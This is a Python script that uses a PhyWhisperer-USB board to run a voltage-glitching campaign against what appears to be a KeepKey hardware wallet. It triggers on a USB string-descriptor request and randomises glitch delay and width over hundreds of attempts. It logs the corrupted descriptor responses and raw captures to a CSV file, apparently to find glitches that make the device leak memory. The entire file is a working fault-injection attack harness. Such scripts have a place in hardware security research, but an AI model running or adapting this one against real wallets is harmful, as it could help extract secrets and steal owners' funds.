#!/usr/bin/env python3

import phywhisperer.usb as pw
import csv
import base64
import random
import pickle
import signal
DESC_TYPE_STRING = 0x03

import usb
import usb.core
import usb.util
from sys import hexversion
from usb.control import get_descriptor

def sendRequest():
  d = usb.core.find(idVendor = 0x2b24,idProduct = 0x0001)
  buf = get_descriptor(d,0x1000,DESC_TYPE_STRING,d.iProduct,1033)
  return buf
  # blen = buf[0] & 0xfe
  # if hexversion >= 0x03020000:
  #   _name = buf[2:blen].tobytes().decode("utf-16-le")
  # else:
  #   _name = buf[2:blen].tostring().decode("utf-16-le")
  # return _name

f_csv = open("classifier-descriptor.csv","w")
spamwriter = csv.writer(f_csv,delimiter=',',quotechar='\"')

import sys

print("Configuring PhyWhispererUSB")
phy = pw.Usb()
# phy.set_usb_mode("LS")
phy.con(program_fpga = True)
phy.addpattern = True
phy.reset_fpga()
phy.set_power_source("off")

pattern_true = [0x80, 0x06, 0x02, 0x03, 0x09, 0x04]
print(pattern_true)
# print(pattern)
import time

from keepkeylib.client import KeepKeyClient, KeepKeyClientVerbose, KeepKeyDebuglinkClient, KeepKeyDebuglinkClientVerbose
import keepkeylib.types_pb2 as types
from keepkeylib.transport_hid import HidTransport

quietMode = False
oneshot = False

# dx = 0.6558979765582688 # usb corruption.
# dx = 0.6519845071548444
# dx = 0.165299
dx = None

def sighandler(signum,frame):
  print("Exception handler hit!")
  raise Exception("bye")

signal.signal(signal.SIGALRM,sighandler)

# randomize in the phywhisperer. 
for i in range(1,1000):
  if dx is None:
    delay = random.uniform(0,69000)
  else:
    delay = random.uniform(dx - 0.05,dx + 0.05)
  width = random.randint(25,105)
  # pattern_true = [0x00]
  phy.set_capture_size(1024)
  phy.set_pattern(pattern_true,mask=[0xff for c in pattern_true])
  phy.set_trigger(num_triggers=1,delays=[phy.ns_trigger(delay)],widths=[width])
  print("Preparing for attempt %d, glitch at %f, %d width" % (i,delay,width))
  phy.set_power_source("off")
  time.sleep(0.5)
  # phy.set_usb_mode(mode="LS")
  phy.set_power_source("host")
  time.sleep(3.0)
  print("-arm")
  phy.arm()
  time.sleep(0.2)
  buf = sendRequest()
  try:
    blen = buf[0] & 0xfe
    if hexversion >= 0x03020000:
      _name = buf[2:blen].tobytes().decode("utf-16-le")
    else:
      _name = buf[2:blen].tostring().decode("utf-16-le")
    data = _name
    print(data)
  except:
    data = ""
  print("Waiting disarm")
  phy.wait_disarmed()
  raw = phy.read_capture_data()
  packets = phy.split_packets(raw)
  spamwriter.writerow([delay,width,data,base64.b64encode(pickle.dumps(raw))])
  printPackets = pw.USBSimplePrintSink(highspeed=phy.get_usb_mode() == 'HS')
  for packet in packets:
    print(packet)
    printPackets.handle_usb_packet(ts=packet['timestamp'],buf=bytearray(packet['contents']),flags=0)

f_csv.close()
print("Done!")
sys.exit(0)

